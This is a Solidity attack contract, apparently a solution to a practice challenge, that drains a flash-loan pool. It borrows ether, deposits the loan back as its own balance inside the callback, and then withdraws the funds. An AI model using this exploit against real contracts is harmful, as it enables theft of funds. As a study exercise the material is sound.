pragma solidity ^0.6.0;

import "./SideEntranceLenderPool.sol";


contract AttackSideEntranceLenderPool {

    SideEntranceLenderPool pool;
    constructor(address _poolAddress) public {
        pool = SideEntranceLenderPool(_poolAddress);
    }

    function execute() external payable {
        // attack here?
        pool.deposit{value: msg.value}();
    }

    function loan(uint256 _amount) public {
        pool.flashLoan(_amount);
    }

    function withdrawFromPool() public {
        pool.withdraw();
    }

    function withdraw() public {
        msg.sender.transfer(address(this).balance);
    }

    receive() external payable {}
}